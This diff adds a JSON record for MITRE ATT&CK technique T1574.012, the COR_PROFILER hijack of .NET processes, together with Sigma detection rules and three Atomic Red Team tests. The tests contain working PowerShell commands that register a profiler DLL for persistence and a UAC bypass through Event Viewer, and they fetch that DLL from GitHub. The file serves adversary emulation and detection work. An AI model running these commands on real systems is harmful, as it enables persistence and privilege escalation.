@@ -1,0 +1,164 @@
+{
+    "id": "T1574.012",
+    "name": "COR_PROFILER",
+    "description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](T1559.001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](T1548.002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)",
+    "platforms": "Windows",
+    "kill_chain_phases": "Persistence, Privilege Escalation, Defense Evasion",
+    "data_sources": "Windows Registry: Windows Registry Key Modification, Process: Process Creation, Module: Module Load, Command: Command Execution",
+    "detection": "For detecting system and user scope abuse of the COR_PROFILER, monitor the Registry for changes to COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH that correspond to system and user environment variables that do not correlate to known developer tools. Extra scrutiny should be placed on suspicious modification of these Registry keys by command line tools like wmic.exe, setx.exe, and [Reg](S0075), monitoring for command-line arguments indicating a change to COR_PROFILER variables may aid in detection. For system, user, and process scope abuse of the COR_PROFILER, monitor for new suspicious unmanaged profiling DLLs loading into .NET processes shortly after the CLR causing abnormal process behavior.(Citation: Red Canary COR_PROFILER May 2020) Consider monitoring for DLL files that are associated with COR_PROFILER environment variables.",
+    "url": "https://attack.mitre.org/techniques/T1574/012",
+    "enrichments": {
+        "attack_rule_map": [],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "ad89044a-8f49-4673-9a55-cbd88a1b374f",
+                    "23590215-4702-4a70-8805-8dc9e58314a2",
+                    "ffeb0780-356e-4261-b036-cfb6bd234335"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "ad89044a-8f49-4673-9a55-cbd88a1b374f",
+                        "lookup_data": {
+                            "description": "This rule detects cor_enable_profiling and cor_profiler environment variables being set and configured.",
+                            "raw": "author: Jose Rodriguez (@Cyb3rPandaH), OTR (Open Threat Research)\ndate: 2020/09/10\ndescription: This rule detects cor_enable_profiling and cor_profiler environment variables\n  being set and configured.\ndetection:\n  condition: selection\n  selection:\n    EventType: Setvalue\n    TargetObject|endswith:\n    - \\COR_ENABLE_PROFILING\n    - \\COR_PROFILER\nid: ad89044a-8f49-4673-9a55-cbd88a1b374f\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/06/26\nreferences:\n- https://twitter.com/jamieantisocial/status/1304520651248668673\n- https://www.slideshare.net/JamieWilliams130/started-from-the-bottom-exploiting-data-sources-to-uncover-attck-behaviors\n- https://www.sans.org/cyber-security-summit/archives\nstatus: test\ntags:\n- attack.persistence\n- attack.privilege_escalation\n- attack.defense_evasion\n- attack.t1574.012\ntitle: Enabling COR Profiler Environment Variables\n",
+                            "sigma:id": "ad89044a-8f49-4673-9a55-cbd88a1b374f",
+                            "title": "Enabling COR Profiler Environment Variables",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "23590215-4702-4a70-8805-8dc9e58314a2",
+                        "lookup_data": {
+                            "description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR.\nThe COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR).\nThese profiliers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.\n(Citation: Microsoft Profiling Mar 2017)\n(Citation: Microsoft COR_PROFILER Feb 2013)\n",
+                            "raw": "author: frack113\ndate: 2021/12/30\ndescription: 'Adversaries may leverage the COR_PROFILER environment variable to hijack\n  the execution flow of programs that load the .NET CLR.\n\n  The COR_PROFILER is a .NET Framework feature which allows developers to specify\n  an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process\n  that loads the Common Language Runtime (CLR).\n\n  These profiliers are designed to monitor, troubleshoot, and debug managed code executed\n  by the .NET CLR.\n\n  (Citation: Microsoft Profiling Mar 2017)\n\n  (Citation: Microsoft COR_PROFILER Feb 2013)\n\n  '\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains|all:\n    - $env:COR_ENABLE_PROFILING\n    - $env:COR_PROFILER\n    - $env:COR_PROFILER_PATH\nfalsepositives:\n- Legitimate administrative script\nid: 23590215-4702-4a70-8805-8dc9e58314a2\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1574.012/T1574.012.md#atomic-test-3---registry-free-process-scope-cor_profiler\nstatus: test\ntags:\n- attack.persistence\n- attack.t1574.012\ntitle: Registry-Free Process Scope COR_PROFILER\n",
+                            "sigma:id": "23590215-4702-4a70-8805-8dc9e58314a2",
+                            "title": "Registry-Free Process Scope COR_PROFILER",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "ffeb0780-356e-4261-b036-cfb6bd234335",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1574.012",
+                            "mitre-cti:description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)\n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)\n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)",
+                            "mitre-cti:name": "COR_PROFILER",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Jesse Brown, Red Canary'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--ffeb0780-356e-4261-b036-cfb6bd234335', 'type': 'attack-pattern', 'created': '2020-06-24T22:30:55.843Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1574.012', 'url': 'https://attack.mitre.org/techniques/T1574/012'}, {'source_name': 'Microsoft Profiling Mar 2017', 'url': 'https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview', 'description': 'Microsoft. (2017, March 30). Profiling Overview. Retrieved June 24, 2020.'}, {'source_name': 'Microsoft COR_PROFILER Feb 2013', 'url': 'https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ee471451(v=vs.100)', 'description': 'Microsoft. (2013, February 4). Registry-Free Profiler Startup and Attach. Retrieved June 24, 2020.'}, {'source_name': 'RedCanary Mockingbird May 2020', 'url': 'https://redcanary.com/blog/blue-mockingbird-cryptominer/', 'description': 'Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.'}, {'source_name': 'Red Canary COR_PROFILER May 2020', 'url': 'https://redcanary.com/blog/cor_profiler-for-persistence/', 'description': 'Brown, J. (2020, May 7). Detecting COR_PROFILER manipulation for persistence. Retrieved June 24, 2020.'}, {'source_name': 'Almond COR_PROFILER Apr 2019', 'url': 'https://offsec.almond.consulting/UAC-bypass-dotnet.html', 'description': 'Almond. (2019, April 30). UAC bypass via elevated .NET applications. Retrieved June 24, 2020.'}, {'source_name': 'GitHub OmerYa Invisi-Shell', 'url': 'https://github.com/OmerYa/Invisi-Shell', 'description': 'Yair, O. (2019, August 19). Invisi-Shell. Retrieved June 24, 2020.'}, {'source_name': 'subTee .NET Profilers May 2017', 'url': 'https://web.archive.org/web/20170720041203/http://subt0x10.blogspot.com/2017/05/subvert-clr-process-listing-with-net.html', 'description': 'Smith, C. (2017, May 18). Subvert CLR Process Listing With .NET Profilers. Retrieved June 24, 2020.'}], 'modified': '2021-08-30T21:35:12.049Z', 'name': 'COR_PROFILER', 'description': 'Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)\\n\\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)\\n\\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}], 'x_mitre_detection': 'For detecting system and user scope abuse of the COR_PROFILER, monitor the Registry for changes to COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH that correspond to system and user environment variables that do not correlate to known developer tools. Extra scrutiny should be placed on suspicious modification of these Registry keys by command line tools like wmic.exe, setx.exe, and [Reg](https://attack.mitre.org/software/S0075), monitoring for command-line arguments indicating a change to COR_PROFILER variables may aid in detection. For system, user, and process scope abuse of the COR_PROFILER, monitor for new suspicious unmanaged profiling DLLs loading into .NET processes shortly after the CLR causing abnormal process behavior.(Citation: Red Canary COR_PROFILER May 2020) Consider monitoring for DLL files that are associated with COR_PROFILER environment variables.', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Windows Registry: Windows Registry Key Modification', 'Process: Process Creation', 'Module: Module Load', 'Command: Command Execution'], 'x_mitre_permissions_required': ['User', 'Administrator']}",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1574.012",
+                "display_name": "Hijack Execution Flow: COR_PROFILER",
+                "atomic_tests": [
+                    {
+                        "name": "User scope COR_PROFILER",
+                        "auto_generated_guid": "9d5f89dc-c3a5-4f8a-a4fc-a6ed02e7cb5a",
+                        "description": "Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).\nThe unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process.\nAdditionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.\nIf the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however,\nthe notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "file_name": {
+                                "description": "unmanaged profiler DLL",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll"
+                            },
+                            "clsid_guid": {
+                                "description": "custom clsid guid",
+                                "type": "string",
+                                "default": "{09108e71-974c-4010-89cb-acf471ae9e2c}"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "\"#{file_name}\" must be present\n",
+                                "prereq_command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll\" -OutFile \"#{file_name}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\#{clsid_guid}\" -ForegroundColor Cyan\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\\InprocServer32\" -Value \"#{file_name}\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"#{clsid_guid}\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"#{file_name}\" -Force | Out-Null\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\nSTART MMC.EXE EVENTVWR.MSC\n",
+                            "cleanup_command": "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\" -Recurse -Force -ErrorAction Ignore \nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "System Scope COR_PROFILER",
+                        "auto_generated_guid": "f373b482-48c8-4ce4-85ed-d40c8b3f7310",
+                        "description": "Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect.\nThe unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity\nlevel of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will\nstill execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "file_name": {
+                                "description": "unmanaged profiler DLL",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll"
+                            },
+                            "clsid_guid": {
+                                "description": "custom clsid guid",
+                                "type": "string",
+                                "default": "{09108e71-974c-4010-89cb-acf471ae9e2c}"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "\"#{file_name}\" must be present\n",
+                                "prereq_command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll\" -OutFile \"#{file_name}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "Write-Host \"Creating system environment variables\" -ForegroundColor Cyan\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"#{clsid_guid}\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"#{file_name}\" -Force | Out-Null\n",
+                            "cleanup_command": "Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Registry-free process scope COR_PROFILER",
+                        "auto_generated_guid": "79d57242-bbef-41db-b301-9d01d9f6e817",
+                        "description": "Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "file_name": {
+                                "description": "unamanged profiler DLL",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll"
+                            },
+                            "clsid_guid": {
+                                "description": "custom clsid guid",
+                                "type": "string",
+                                "default": "{09108e71-974c-4010-89cb-acf471ae9e2c}"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "\"#{file_name}\" must be present\n",
+                                "prereq_command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll\" -OutFile \"#{file_name}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "$env:COR_ENABLE_PROFILING = 1\n$env:COR_PROFILER = '#{clsid_guid}'\n$env:COR_PROFILER_PATH = '\"#{file_name}\"'\nPOWERSHELL -c 'Start-Sleep 1'\n",
+                            "cleanup_command": "$env:COR_ENABLE_PROFILING = 0\n$env:COR_PROFILER = ''\n$env:COR_PROFILER_PATH = ''\n",
+                            "name": "powershell"
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 17:32:46"
+}
